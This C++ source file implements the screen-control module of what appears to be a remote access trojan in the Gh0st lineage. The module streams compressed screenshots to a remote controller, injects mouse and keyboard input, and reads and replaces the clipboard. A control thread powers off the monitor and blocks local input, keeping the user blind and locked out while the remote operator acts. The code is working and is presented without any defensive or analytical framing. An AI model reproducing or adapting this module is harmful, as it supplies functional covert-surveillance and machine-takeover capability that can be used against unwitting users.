// ScreenManagers.cpp: implementation of the CScreenQuickManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "ScreenQuickManager.h"
#include <WinUser.h>  

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenQuickManager::CScreenQuickManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = FALSE;
	m_biBitCount = 32;
	m_fps = 1;
	m_pScreenSpy = new CScreenSpy(32);
	m_bIsWorking = true;
	m_bIsBlankScreen = false;
	m_bIsBlockInput = false;
	m_bIsCaptureLayer = false;
	m_hDeskTopDC = GetDC(GetDesktopWindow());
	m_oldwidth = ::GetSystemMetrics(SM_CXVIRTUALSCREEN);
	m_oldheigh = ::GetSystemMetrics(SM_CYVIRTUALSCREEN);
	m_MYtagMSG = nullptr;
	m_MYtagMSGsize = sizeof(MYtagMSG);

	m_bAlgorithm = COMMAND_SCREEN_ALGORITHM_HOME;
	m_hWorkThread = (HANDLE)_beginthreadex(NULL, 0, WorkThread, this, 0, NULL);
	m_hBlankThread = (HANDLE)_beginthreadex(NULL, 0, ControlThread, this, 0, NULL);
	m_buser = TRUE;
}

CScreenQuickManager::~CScreenQuickManager()
{
	if (!m_buser) return;
	m_oldwidth = 0;
	m_oldheigh = 0;
	InterlockedExchange((LPLONG)&m_bIsBlankScreen, false);
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hBlankThread, INFINITE);
	CloseHandle(m_hWorkThread);
	CloseHandle(m_hBlankThread);
	ReleaseDC(NULL, m_hDeskTopDC);
	SAFE_DELETE(m_pScreenSpy);

}

void CScreenQuickManager::ResetScreen(int biBitCount)
{
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	SAFE_DELETE(m_pScreenSpy);

	if (biBitCount == 3)		// 4位灰度
		m_pScreenSpy = new CScreenSpy(4, true);
	else if (biBitCount == 7)	// 8位灰度
		m_pScreenSpy = new CScreenSpy(8, true);
	else
		m_pScreenSpy = new CScreenSpy(biBitCount);

	m_pScreenSpy->setAlgorithm(m_bAlgorithm);
	m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
	m_pScreenSpy->SetFps(m_fps);

	m_biBitCount = biBitCount;
	m_hWorkThread = (HANDLE)_beginthreadex(NULL, 0, WorkThread, this, 0, NULL);
}


void CScreenQuickManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	switch (lpBuffer[0])
	{
	case COMMAND_FLUSH_QUICK:
		ResetScreen(32);
		break;
	case COMMAND_SCREEN_CONTROL_QUICK:
	{
		if (m_bIsBlockInput)
			BlockInput(FALSE);       // 远程仍然可以操作
		ProcessCommand(lpBuffer + 1, nSize - 1);
		if (m_bIsBlockInput)
			BlockInput(m_bIsBlockInput);
	}
	break;
	case COMMAND_SCREEN_ALGORITHM_RESET:
		m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
		m_pScreenSpy->setAlgorithm(m_bAlgorithm);
		break;
	case COMMAND_NEXT_QUICK:
		// 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回
		NotifyDialogIsOpen();
		break;
	case COMMAND_SCREEN_RESET_QUICK:
		ResetScreen(*(LPBYTE)&lpBuffer[1]);
		break;
	case COMMAND_SCREEN_FPS_QUICK:
	{
		m_fps = (int)(*(LPBYTE)&lpBuffer[1]);
		m_pScreenSpy->SetFps(m_fps);
	}
	break;
	case COMMAND_SCREEN_BLOCK_INPUT_QUICK: //ControlThread里锁定
		InterlockedExchange((LPLONG)&m_bIsBlockInput, *(LPBYTE)&lpBuffer[1]);
		BlockInput(m_bIsBlockInput);
		break;
	case COMMAND_SCREEN_BLANK_QUICK:
		InterlockedExchange((LPLONG)&m_bIsBlankScreen, *(LPBYTE)&lpBuffer[1]);
		break;
	case COMMAND_SCREEN_CAPTURE_LAYER_QUICK:
		memcpy(&m_bIsCaptureLayer, lpBuffer + 1, sizeof(bool));
		//	m_bIsCaptureLayer = *(LPBYTE)&lpBuffer[1];
		m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
		break;
	case COMMAND_SCREEN_GET_CLIPBOARD_QUICK:
		SendLocalClipboard();
		break;
	case COMMAND_SCREEN_SET_CLIPBOARD_QUICK:
		UpdateLocalClipboard((char*)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_COMMAND_SCREEN_UALITY60:
		m_pScreenSpy->SendUALITY(60);
		break;
	case COMMAND_COMMAND_SCREEN_UALITY85:
		m_pScreenSpy->SendUALITY(85);
		break;
	case COMMAND_COMMAND_SCREEN_UALITY100:
		m_pScreenSpy->SendUALITY(100);
		break;

	default:
		Trace("OnReceive default--------\n");
		break;
	}
}

void CScreenQuickManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBitmapInfoSize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	lpBuffer[0] = TOKEN_BITMAPINFO_QUICK;
	memcpy(lpBuffer + 1, m_pScreenSpy->getBitmapInfo(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	SAFE_DELETE_AR(lpBuffer);
}

void CScreenQuickManager::sendsize()
{
	RECT m_rect;
	m_rect.left = m_pScreenSpy->iScreenX;
	m_rect.top = m_pScreenSpy->iScreenY;
	m_rect.right = m_pScreenSpy->m_nFullWidth;
	m_rect.bottom = m_pScreenSpy->m_nFullHeight;
	LPBYTE	lpBuffer = new BYTE[sizeof(RECT) + 1];
	lpBuffer[0] = TOKEN_SIZE_QUICK;
	memcpy(lpBuffer + 1, &m_rect, sizeof(RECT));
	Send(lpBuffer, sizeof(RECT) + 1);
	SAFE_DELETE_AR(lpBuffer);
}

void CScreenQuickManager::sendFirstScreen()
{
	LPVOID	lpFirstScreen = NULL;
	DWORD	dwBytes;
	lpFirstScreen = m_pScreenSpy->getFirstScreen(&dwBytes);
	if (dwBytes == 0 || !lpFirstScreen)
		return;
	unsigned long	destLen = (unsigned long)((double)dwBytes * 1.001 + 12);
	LPBYTE			pDest = new BYTE[destLen];
	if (pDest == NULL) 		return;
	if (compress(pDest, &destLen, (byte*)lpFirstScreen, dwBytes) != Z_OK)
	{
		SAFE_DELETE_AR(pDest);
		return;
	}
	Trace("%d %d %0.2f\r\n", dwBytes, destLen, (double)dwBytes / (double)destLen);
	DWORD	dwBytesLength = 1 + destLen + 4;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;
	lpBuffer[0] = TOKEN_FIRSTSCREEN_QUICK;
	memcpy(lpBuffer + 1, &dwBytes, 4);
	memcpy(lpBuffer + 5, pDest, destLen);
	Send(lpBuffer, dwBytesLength);
	SAFE_DELETE_AR(lpBuffer);
	SAFE_DELETE_AR(pDest);
}

void CScreenQuickManager::sendNextScreen()
{
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);

	if (dwBytes == 0 || !lpNetScreen)
		return;

	unsigned long	destLen = (unsigned long)((double)dwBytes * 1.001 + 12);
	LPBYTE			pDest = new BYTE[destLen];
	if (pDest == NULL) 		return;
	if (compress(pDest, &destLen, (byte*)lpNetScreen, dwBytes) != Z_OK)
	{
		SAFE_DELETE_AR(pDest);
		return;
	}
	Trace("%d %d %0.2f\r\n", dwBytes, destLen, (double)dwBytes/ (double)destLen);
	DWORD	dwBytesLength = 1 + destLen + 4;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	lpBuffer[0] = TOKEN_NEXTSCREEN_QUICK;
	memcpy(lpBuffer + 1, &dwBytes, 4);
	memcpy(lpBuffer + 5, (const char*)pDest, destLen);
	Send(lpBuffer, dwBytesLength);
	SAFE_DELETE_AR(lpBuffer);
	SAFE_DELETE_AR(pDest);
}

unsigned CScreenQuickManager::WorkThread(LPVOID lparam)
{
	CScreenQuickManager* pThis = (CScreenQuickManager*)lparam;

	pThis->sendBITMAPINFO();
	// 等控制端对话框打开
	if (pThis->m_bIsWorking) 	pThis->WaitForDialogOpen();
	pThis->sendsize();
	pThis->sendFirstScreen();
	pThis->m_bIsWorking = true;
	try // 控制端强制关闭时会出错
	{
		while (pThis->m_bIsWorking)
		{
			pThis->sendNextScreen();
		}
	}
	catch (...) {};

	return 0;
}

// 创建这个线程主要是为了保持一直黑屏
unsigned CScreenQuickManager::ControlThread(LPVOID lparam)
{
	static	bool bIsScreenBlanked = false;
	CScreenQuickManager* pThis = (CScreenQuickManager*)lparam;
	pThis->WaitForDialogOpen();
	while (pThis->IsConnect())
	{
		// 分辨率大小改变了
		if (pThis->IsMetricsChange() && pThis->m_bIsWorking)
		{
			pThis->ResetScreen(pThis->GetCurrentPixelBits());
		}
		if (pThis->m_bIsBlankScreen)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
			BlockInput(TRUE);
		}
		else if (bIsScreenBlanked)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
			PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
			bIsScreenBlanked = false;
			BlockInput(FALSE);
		}
		Sleep(200);
	}
	BlockInput(FALSE);

	return -1;
}

#if !defined(GET_WHEEL_DELTA_WPARAM)
#define GET_WHEEL_DELTA_WPARAM(wParam) ((short)HIWORD(wParam))
#endif

void CScreenQuickManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
{
	
	if (nSize % m_MYtagMSGsize != 0)
		return;

	m_pScreenSpy->SwitchInputDesktop();

	// 命令个数
	int	nCount = nSize / m_MYtagMSGsize;

	// 处理多个命令
	for (int i = 0; i < nCount; i++)
	{
		BlockInput(false);
		m_MYtagMSG = (MYtagMSG*)(lpBuffer + i * m_MYtagMSGsize);

		DWORD dx = (DWORD)(65535.0f / (GetDeviceCaps(m_hDeskTopDC, DESKTOPHORZRES) - 1) * m_MYtagMSG->x);
		DWORD dy = (DWORD)(65535.0f / (GetDeviceCaps(m_hDeskTopDC, DESKTOPVERTRES) - 1) * m_MYtagMSG->y);

		switch (m_MYtagMSG->message)
		{
		case WM_MOUSEMOVE:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, dx, dy, 0, 0);
			break;
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN, dx, dy, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN, dx, dy, 0, 0);
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN, dx, dy, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			break;
		case WM_MBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN | MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN | MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_WHEEL, dx, dy, GET_WHEEL_DELTA_WPARAM((UINT)(m_MYtagMSG->wParam)), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			if ((UINT)(m_MYtagMSG->wParam) == VK_LEFT || (UINT)(m_MYtagMSG->wParam) == VK_RIGHT || (UINT)(m_MYtagMSG->wParam) == VK_UP || (UINT)(m_MYtagMSG->wParam) == VK_DOWN)
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), KEYEVENTF_EXTENDEDKEY, 0);
			else
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			if ((UINT)(m_MYtagMSG->wParam) == VK_LEFT || (UINT)(m_MYtagMSG->wParam) == VK_RIGHT || (UINT)(m_MYtagMSG->wParam) == VK_UP || (UINT)(m_MYtagMSG->wParam) == VK_DOWN)
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
			else
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
}

void CScreenQuickManager::UpdateLocalClipboard(char* buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, len);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CScreenQuickManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = int(GlobalSize(hglb)) + 1;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT_QUICK;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}


// 屏幕分辨率是否发生改变
bool CScreenQuickManager::IsMetricsChange()
{
	if ((m_oldwidth != ::GetSystemMetrics(SM_CXVIRTUALSCREEN)) || (m_oldheigh != ::GetSystemMetrics(SM_CYVIRTUALSCREEN)))
	{
		if (m_oldwidth == 0 || m_oldheigh == 0)
		{
			return false;
		}
		m_oldwidth = ::GetSystemMetrics(SM_CXVIRTUALSCREEN);
		m_oldheigh = ::GetSystemMetrics(SM_CYVIRTUALSCREEN);
		return true;
	}

	return false;
}

bool CScreenQuickManager::IsConnect()
{
	return (m_pClient->IsRunning()) ? true : false;
}

int CScreenQuickManager::GetCurrentPixelBits()
{
	return m_biBitCount;
}

